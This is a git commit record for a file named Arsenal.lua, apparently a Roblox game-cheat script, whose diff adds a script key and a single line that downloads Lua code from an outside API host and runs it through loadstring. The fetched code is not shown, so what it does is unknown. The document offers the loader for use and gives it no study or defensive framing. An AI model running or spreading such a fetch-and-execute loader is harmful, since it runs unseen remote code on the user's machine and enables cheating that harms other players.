6b1f640a4fc741b310195c914c1cc1b4da412668
toxicmahmoudmontaser-dev <toxicmahmoudmontaser@gmail.com>
2026-06-19 00:33:14 +0300

    Update Arsenal.lua

--- Arsenal.lua
+++ Arsenal.lua
@@ -1,1 +1,3 @@
+getgenv().SCRIPT_KEY = "47fef1c3-cbfb-4d5a-951c-c0f1446b1a3f"
 
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/e761f30130cecc89e7ca7975148c5468eeb84386791855ce71e6999a7e7de8ab/download"))()
